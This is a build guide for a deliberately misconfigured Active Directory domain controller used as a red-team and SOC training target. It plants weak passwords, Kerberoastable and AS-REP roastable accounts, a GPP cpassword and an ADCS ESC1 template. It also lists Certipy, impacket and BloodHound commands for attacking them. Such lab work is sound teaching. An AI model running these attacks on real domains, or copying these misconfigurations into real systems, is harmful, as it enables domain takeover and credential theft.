# Windows Server 2019 — Active Directory — Base Image Build Guide

| Field | Value |
|-------|-------|
| **Image name** | `windows-server-2019-ad` |
| **VHDX path** | `C:\CyberLab\Templates\windows-server-2019-ad.vhdx` |
| **Used in** | Lab 1 (Red Team/Blue Team — AD attack target), Lab 3 (SOC Analyst — AD for event generation) |
| **Role** | Intentionally misconfigured Active Directory Domain Controller |
| **Build script** | None — built manually via Server Manager and PowerShell |
| **Resources** | 2 vCPU, 4 GB RAM, 60 GB dynamic VHDX |
| **Base OS** | Windows Server 2019 Standard or Datacenter (amd64) |

> **WARNING:** This domain controller is intentionally misconfigured with vulnerable accounts, dangerous GPO settings, and ADCS ESC1 to enable student attack exercises. Never connect to a production domain or network.

---

## Table of Contents

1. [Prerequisites](#1-prerequisites)
2. [Hyper-V VM Creation](#2-hyper-v-vm-creation)
3. [OS Installation and Initial Setup](#3-os-installation-and-initial-setup)
4. [Promoting to Domain Controller](#4-promoting-to-domain-controller)
5. [Active Directory Structure](#5-active-directory-structure)
6. [User Accounts and Intentional Weaknesses](#6-user-accounts-and-intentional-weaknesses)
7. [Group Policy and GPP Credentials Vulnerability](#7-group-policy-and-gpp-credentials-vulnerability)
8. [ADCS ESC1 Configuration](#8-adcs-esc1-configuration)
9. [Splunk UF and Sysmon for Lab 3](#9-splunk-uf-and-sysmon-for-lab-3)
10. [Network Interfaces](#10-network-interfaces)
11. [Default Credentials After Build](#11-default-credentials-after-build)
12. [Verification Steps](#12-verification-steps)
13. [Resetting AD Between Classes](#13-resetting-ad-between-classes)
14. [Snapshot and Storage](#14-snapshot-and-storage)
15. [Troubleshooting](#15-troubleshooting)

---

## 1. Prerequisites

- Windows Server 2019 Standard or Datacenter ISO (Volume Licensing / MSDN / Evaluation Center)
- Evaluation ISO: `https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019`
- Build time: approximately 90–120 minutes

---

## 2. Hyper-V VM Creation

| Setting | Value |
|---------|-------|
| Generation | **Generation 2** |
| Startup RAM | **4096 MB** |
| Dynamic Memory | Disabled |
| Processor count | **2 vCPU** |
| Virtual hard disk | **60 GB**, Dynamically expanding |
| Network adapter | External-Internet (for evaluation license check and updates) |

---

## 3. OS Installation and Initial Setup

Install Windows Server 2019. When prompted:
- Select **Windows Server 2019 Standard (Desktop Experience)** — the GUI version
- Create a full disk partition
- Set Administrator password: `LabBuildPass!2024` (overwritten at deploy)
- Rename the computer: `SCPS-DC01`

```powershell
# Rename the computer
Rename-Computer -NewName "SCPS-DC01" -Force
# Set timezone
Set-TimeZone -Id "Eastern Standard Time"
# Disable IE Enhanced Security Configuration (allows web browsing for tool downloads)
$AdminKey = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}"
Set-ItemProperty -Path $AdminKey -Name "IsInstalled" -Value 0
```

---

## 4. Promoting to Domain Controller

Install AD DS and promote the server to a domain controller for a new domain.

```powershell
# Install AD DS role and management tools
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promote to DC — creates a new forest and domain
Import-Module ADDSDeployment
Install-ADDSForest `
    -DomainName "corp.scps.local" `
    -DomainNetbiosName "CORP" `
    -ForestMode "WinThreshold" `
    -DomainMode "WinThreshold" `
    -InstallDns `
    -SafeModeAdministratorPassword (ConvertTo-SecureString "DsrmPass!2024" -AsPlainText -Force) `
    -Force

# The server reboots automatically after promotion
```

After reboot, log in as `CORP\Administrator`.

---

## 5. Active Directory Structure

Create the OU structure that mirrors a realistic corporate environment:

```powershell
Import-Module ActiveDirectory

$base = "DC=corp,DC=scps,DC=local"

# Organisational Units
New-ADOrganizationalUnit -Name "SCPS_Corp" -Path $base -ProtectedFromAccidentalDeletion $false
New-ADOrganizationalUnit -Name "Users"       -Path "OU=SCPS_Corp,$base" -ProtectedFromAccidentalDeletion $false
New-ADOrganizationalUnit -Name "Computers"   -Path "OU=SCPS_Corp,$base" -ProtectedFromAccidentalDeletion $false
New-ADOrganizationalUnit -Name "ServiceAccounts" -Path "OU=SCPS_Corp,$base" -ProtectedFromAccidentalDeletion $false
New-ADOrganizationalUnit -Name "Groups"      -Path "OU=SCPS_Corp,$base" -ProtectedFromAccidentalDeletion $false
```

---

## 6. User Accounts and Intentional Weaknesses

Every account in the table below is deliberately misconfigured to enable a specific AD attack technique. This table is the authoritative reference for Lab 1 instructors designing the red team attack chain.

| Account | Password | Weakness | Attack Technique | BloodHound Path |
|---------|----------|----------|-----------------|----------------|
| `john.smith` | `Password1` | Service Principal Name (SPN) set: `HTTP/webserver.corp.scps.local` | **Kerberoasting** — request TGS for the SPN and offline-crack the NTLM hash | BloodHound shows `JOHN.SMITH@CORP.SCPS.LOCAL` as Kerberoastable |
| `jane.doe` | `Summer2023!` | Pre-authentication disabled (`DoesNotRequirePreAuth`) | **AS-REP Roasting** — request an AS-REP for the account without a valid password and offline-crack the hash | BloodHound shows `AS-REP Roastable` |
| `svc.backup` | `Backup2024!` | Member of **Domain Admins** group | **Privilege escalation** — cracking or Kerberoasting this account gives immediate Domain Admin | BloodHound shows direct Domain Admin membership |
| `svc.sql` | `SqlServer2019!` | SPN set: `MSSQLSvc/sqlserver.corp.scps.local:1433` | **Kerberoasting** — SQL service account with weak password | BloodHound shows second Kerberoastable account |
| `bob.admin` | `Admin@2024` | Member of **Local Administrators** on SCPS-WS01 | **Pass-the-hash** — after cracking `bob.admin`, perform PtH to authenticate to other workstations without the cleartext password | BloodHound shows `AdminTo` relationship to SCPS-WS01 |

### Creating the Accounts

```powershell
$ou_users = "OU=Users,OU=SCPS_Corp,DC=corp,DC=scps,DC=local"
$ou_svc   = "OU=ServiceAccounts,OU=SCPS_Corp,DC=corp,DC=scps,DC=local"

# john.smith — Kerberoastable
New-ADUser -Name "John Smith" -SamAccountName "john.smith" -UserPrincipalName "john.smith@corp.scps.local" `
    -Path $ou_users -AccountPassword (ConvertTo-SecureString "Password1" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true
Set-ADUser "john.smith" -ServicePrincipalNames @{Add="HTTP/webserver.corp.scps.local"}

# jane.doe — AS-REP Roastable
New-ADUser -Name "Jane Doe" -SamAccountName "jane.doe" -UserPrincipalName "jane.doe@corp.scps.local" `
    -Path $ou_users -AccountPassword (ConvertTo-SecureString "Summer2023!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true -DoesNotRequirePreAuth $true

# svc.backup — Domain Admin (privilege escalation path)
New-ADUser -Name "svc.backup" -SamAccountName "svc.backup" -UserPrincipalName "svc.backup@corp.scps.local" `
    -Path $ou_svc -AccountPassword (ConvertTo-SecureString "Backup2024!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true
Add-ADGroupMember -Identity "Domain Admins" -Members "svc.backup"

# svc.sql — Kerberoastable (SQL SPN)
New-ADUser -Name "svc.sql" -SamAccountName "svc.sql" -UserPrincipalName "svc.sql@corp.scps.local" `
    -Path $ou_svc -AccountPassword (ConvertTo-SecureString "SqlServer2019!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true
Set-ADUser "svc.sql" -ServicePrincipalNames @{Add="MSSQLSvc/sqlserver.corp.scps.local:1433"}

# bob.admin — Local admin on workstations
New-ADUser -Name "Bob Admin" -SamAccountName "bob.admin" -UserPrincipalName "bob.admin@corp.scps.local" `
    -Path $ou_users -AccountPassword (ConvertTo-SecureString "Admin@2024" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true
Add-ADGroupMember -Identity "Domain Users" -Members "bob.admin"
# bob.admin's local admin on SCPS-WS01 is configured via GPO or direct local group addition at workstation
```

---

## 7. Group Policy and GPP Credentials Vulnerability

### GPP Credentials (Group Policy Preferences Password Vulnerability)

Group Policy Preferences (GPP) allowed administrators to set local account passwords through Group Policy. The password was stored AES-encrypted in SYSVOL, but Microsoft published the encryption key in 2012, making all GPP passwords trivially decryptable. Even though Microsoft patched this in MS14-025, the SYSVOL files persist in environments that were configured before the patch.

This vulnerability is replicated in the lab by creating a GPP with a local account password.

```powershell
# Create a GPP that sets a local administrator password
# This creates a Groups.xml file in SYSVOL with an encrypted (but crackable) cpassword

# Method: Use Group Policy Management (GUI) to create the GPP
# Computer Configuration > Preferences > Control Panel Settings > Local Users and Groups
# Action: Update, Local Group: Administrators, Members: Add helpdesk01 with password HelpDesk!2024

# Alternatively, create the Groups.xml manually:
$sysvol_gpp_path = "C:\Windows\SYSVOL\domain\Policies\{NEW-GPO-GUID}\Machine\Preferences\Groups"
New-Item -Path $sysvol_gpp_path -ItemType Directory -Force

# The cpassword below is the AES-encrypted value of "HelpDesk!2024"
# Students use Get-GPPPassword or gpp-decrypt to recover it
$groups_xml = @'
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators" image="2"
         changed="2024-01-15 09:00:00" uid="{ABC12345-1234-1234-1234-ABCDEF012345}">
    <Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0"
                removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators">
      <Members>
        <Member name="helpdesk01" action="ADD" sid=""
                cpassword="hHJHHbVVBNVEbvkgEJuPldjU2iuSfRURlOZEmVrDGrI="
                changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" userName="helpdesk01"/>
      </Members>
    </Properties>
  </Group>
</Groups>
'@
$groups_xml | Out-File -FilePath "$sysvol_gpp_path\Groups.xml" -Encoding UTF8
```

**SYSVOL path students use to find this:**
```
\\corp.scps.local\SYSVOL\corp.scps.local\Policies\
```

Students use `Get-GPPPassword` (PowerSploit) or the Impacket `Get-GPPPassword.py` to extract and decrypt the cpassword.

---

## 8. ADCS ESC1 Configuration

Active Directory Certificate Services (ADCS) with misconfigured certificate templates enables privilege escalation via certificate-based attacks (ESC1 — Enroll, Subject Alternative Name as any user).

### Install ADCS

```powershell
Install-WindowsFeature -Name ADCS-Cert-Authority -IncludeManagementTools
Install-AdcsCertificationAuthority `
    -CAType EnterpriseRootCa `
    -CaCommonName "CORP-CA" `
    -KeyLength 2048 `
    -HashAlgorithmName SHA256 `
    -ValidityPeriod Years `
    -ValidityPeriodUnits 5 `
    -Force
```

### Create a Vulnerable Certificate Template (ESC1)

Using the Certificate Templates console (`certtmpl.msc`):

1. Duplicate the **User** template.
2. Name it `VulnerableUserTemplate`.
3. On the **Subject Name** tab, select **Supply in the request** — this is the ESC1 misconfiguration.
4. On the **Security** tab, grant **Domain Users** the **Enroll** permission.
5. Publish the template to the CA.

Students exploit this using Certipy:

```bash
certipy find -u john.smith@corp.scps.local -p Password1 -dc-ip 10.{ClassId}.{StudentId}.21
certipy req -u john.smith@corp.scps.local -p Password1 -dc-ip 10.{ClassId}.{StudentId}.21 \
    -ca CORP-CA -template VulnerableUserTemplate -upn administrator@corp.scps.local
certipy auth -pfx administrator.pfx -domain corp.scps.local
```

---

## 9. Splunk UF and Sysmon for Lab 3

Install Sysmon and Splunk Universal Forwarder on the domain controller (same procedure as Windows 10 Enterprise). The DC generates particularly high-value security events including Kerberos ticket requests (EventIDs 4768, 4769, 4771) and LDAP queries.

Key additional event IDs to configure for the DC:

```powershell
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Changes" /success:enable
```

---

## 10. Network Interfaces

Single adapter. In Lab 1, connected to `corporate-net-C{ClassId}-S{StudentId}` and assigned `10.{ClassId}.{StudentId}.21`. In Lab 3, assigned per the `03-soc-analyst.json` template.

---

## 11. Default Credentials After Build

| Account | Password | Notes |
|---------|----------|-------|
| `CORP\Administrator` | `LabBuildPass!2024` (overridden at deploy) | Domain Administrator |
| `CORP\john.smith` | `Password1` | Kerberoastable — intentionally weak |
| `CORP\jane.doe` | `Summer2023!` | AS-REP Roastable — intentionally weak |
| `CORP\svc.backup` | `Backup2024!` | Domain Admin member — privilege escalation target |
| `CORP\svc.sql` | `SqlServer2019!` | Kerberoastable — SQL service account |
| `CORP\bob.admin` | `Admin@2024` | Local admin on workstations — PtH target |
| DSRM | `DsrmPass!2024` | Directory Services Restore Mode password |

---

## 12. Verification Steps

### Step 1 — AD Healthy

```powershell
Get-ADDomain
# Expected: DomainName = corp.scps.local

dcdiag /test:replications
# Expected: passed
```

### Step 2 — SPNs Set

```powershell
Get-ADUser john.smith -Properties ServicePrincipalName | Select ServicePrincipalName
# Expected: HTTP/webserver.corp.scps.local

Get-ADUser svc.sql -Properties ServicePrincipalName | Select ServicePrincipalName
# Expected: MSSQLSvc/sqlserver.corp.scps.local:1433
```

### Step 3 — AS-REP Roasting Flag

```powershell
Get-ADUser jane.doe -Properties DoesNotRequirePreAuth | Select DoesNotRequirePreAuth
# Expected: True
```

### Step 4 — GPP File in SYSVOL

```powershell
Get-ChildItem "C:\Windows\SYSVOL\domain\Policies\" -Recurse -Filter "Groups.xml"
# Expected: Groups.xml found in at least one policy folder
```

### Step 5 — From Kali (After Deployment) — Verify Kerberoasting Works

```bash
impacket-GetUserSPNs corp.scps.local/john.smith:Password1 -dc-ip 10.{ClassId}.{StudentId}.21 -request
# Expected: TGS hash for svc.sql and john.smith printed
```

---

## 13. Resetting AD Between Classes

Because each student session uses a differencing disk, restoring the parent VHDX baseline for the next class is automatic — deploy a new child differencing disk and the AD is clean. However, if the shared class instance of the DC was modified during a live session, reset it:

```powershell
# On the Hyper-V host — stop the shared DC VM
Stop-VM -Name "winserv2019ad-C1" -Force

# Delete the session's differencing disk
Remove-Item "C:\CyberLab\VMs\{SessionId}\winserv2019ad-C1.avhdx"

# The orchestration module creates a new child disk from the clean parent VHDX
# on the next deployment
```

---

## 14. Snapshot and Storage

```powershell
Stop-VM -Name "winserv2019ad-build" -Force
Move-Item "winserv2019ad-build.vhdx" "C:\CyberLab\Templates\windows-server-2019-ad.vhdx"
Set-ItemProperty -Path "C:\CyberLab\Templates\windows-server-2019-ad.vhdx" -Name IsReadOnly -Value $true
```

---

## 15. Troubleshooting

### dcdiag Fails on replications

**Cause:** This is a standalone DC (no replication partner) — the replications test may show warnings. This is expected.

**Verify the DC is otherwise healthy:**

```powershell
dcdiag /test:services
dcdiag /test:dns
```

### BloodHound Cannot Enumerate the Domain

**Symptom:** BloodHound collector returns no data from Kali.

**Fix:** Ensure the Kali VM can resolve `corp.scps.local`. The pfSense LAN (internal DNS) should forward resolution to the DC. Alternatively, set the Kali VM's DNS to `10.{ClassId}.{StudentId}.21` directly:

```bash
echo "nameserver 10.{ClassId}.{StudentId}.21" > /etc/resolv.conf
bloodhound-python -u john.smith -p Password1 -d corp.scps.local -ns 10.{ClassId}.{StudentId}.21 -c all
```
